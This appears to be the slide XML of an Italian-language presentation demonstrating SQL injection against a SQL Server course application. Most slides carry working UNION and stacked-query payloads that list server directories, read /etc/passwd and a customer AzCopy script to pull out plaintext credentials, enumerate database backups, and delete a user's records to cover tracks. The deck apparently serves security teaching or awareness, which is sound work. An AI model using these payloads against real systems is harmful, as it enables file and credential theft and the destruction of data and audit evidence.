                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{05FCEF64-BAEF-0734-31E9-C46228160C64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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{62A27826-F33A-EF78-7EE7-57721E61D1C3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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL,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full_filesystem_path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, NULL, NULL, NULL, NULL FROM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sys.dm_os_enumerate_filesystem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('/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etc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','*.*') ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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188986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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8D106401-D067-904C-EC86-547F019C27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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF3FC83D-2442-488D-95BD-03E97D9D332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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> il </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>contenuto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> di un file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> server*</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E03A5E6E-8915-0046-FC00-D0803052D4DB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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B09683C9-7D13-5F24-E3B0-6998B9DC5A3C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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL,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BulkColumn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, NULL, NULL, NULL, NULL FROM OPENROWSET(BULK N'/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etc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/passwd', SINGLE_CLOB) AS Contents ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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511115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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5F97DA1-B9FD-8812-BC2D-3629633D3F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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{03CD8391-B464-B5CF-9082-3CF6D13A161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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Elencare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file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> server**</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E8E38738-BFC1-146C-0375-484E39C4EBCF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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3CB365B2-F282-A8A3-B267-19E743A8717F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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL,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full_filesystem_path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, NULL, NULL, NULL, NULL FROM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sys.dm_os_enumerate_filesystem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('c:\temp\Customer','*.ps1') ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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907834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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D18FD7FC-B8B1-4CB8-73E1-C7086085F7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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{57D50E93-7CD7-0D77-FD5A-1339293B60E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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> il </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>contenuto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> di un file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> server**</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{87373525-BD8B-F495-EE5A-BB95CF88A8D7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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{455AE3D5-D1BE-3259-AE95-98CB53EA6AC3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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL,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BulkColumn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, NULL, NULL, NULL, NULL FROM OPENROWSET(BULK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N'c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:\temp\Customer\AzCopyFromCustomerSAS.ps1', SINGLE_CLOB) AS Contents ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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117587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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D3FD5820-3FD0-9838-1C86-2B2098571F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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F6F43C7-FDD5-D10F-AC8F-9CF052EC987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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Estrarre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>credenziali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chiaro</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> da uno script</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9804557-1CD6-10FF-47A5-107CBC090365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6500" y="448013"/>
            <a:ext cx="911000" cy="91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D755FCC-4ABD-00BB-6CC0-DD380C12BD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8631" y="2027670"/>
            <a:ext cx="5766738" cy="2180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861412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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B9B7C7E-CFB0-1A67-52EC-00BE10D91F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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1C420A99-8D1E-F15B-3A68-9B6CFDA4F5A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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Estrarre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>credenziali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chiaro</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> da uno script</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A6B3B25B-C446-2F2F-4DCF-87F45774B230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6500" y="448013"/>
            <a:ext cx="911000" cy="91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CFB3EA5-5B3F-5E47-D8A7-457F41FAAB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8631" y="2027670"/>
            <a:ext cx="5766738" cy="2180183"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1" descr="A pair of handcuffs on a black background&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60E8B240-5C2C-E519-A89D-434A5EE7E3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80702" y="2225258"/>
            <a:ext cx="1982595" cy="1982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401673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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FFC4F3D9-4C60-3D2D-5635-53F8E82B87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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{049DB303-33EA-2975-5CBD-8F7C630A93B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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Coprire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>proprie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tracce</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C28B8EFA-2249-C665-5F5C-FDC45E80FD2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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1D4D5A63-6896-0F75-994E-CAA72275A31A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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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'; DELETE FROM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dbo.Courses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 WHERE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UserId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 IN (SELECT Id FROM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dbo.Users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 WHERE Email = 'pippo@disney.com'); DELETE FROM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dbo.Users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 WHERE Email = 'pippo@disney.com';--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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167740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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3D088E20-8A21-173F-97BF-AE0FFABA34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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B9CE168-F2C0-AFE6-50D6-3D6C6559B5E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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Elencare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backup </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dei</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> database</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B866514A-43EE-105A-8743-47E0B02E90E5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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A74DCF03-0F8A-B339-2F22-241E946B3DCB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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL, STRING_AGG(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physical_device_name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, '; '), NULL, NULL, NULL, NULL FROM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msdb.dbo.backupmediafamily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 GROUP BY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media_set_id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 ORDER BY 2;--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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029046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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E2261BE6-231D-00C1-8BE4-09FAAB65F0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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DCFECB07-BD25-1BB0-3CBC-99BC37D80D1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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Rendere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>inutilizzabili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backup</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F91EC2C8-9A30-AC61-0011-C9A534195930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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{666FACCF-5F3E-11B9-D22D-F2A2E0523C22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128450" y="2195169"/>
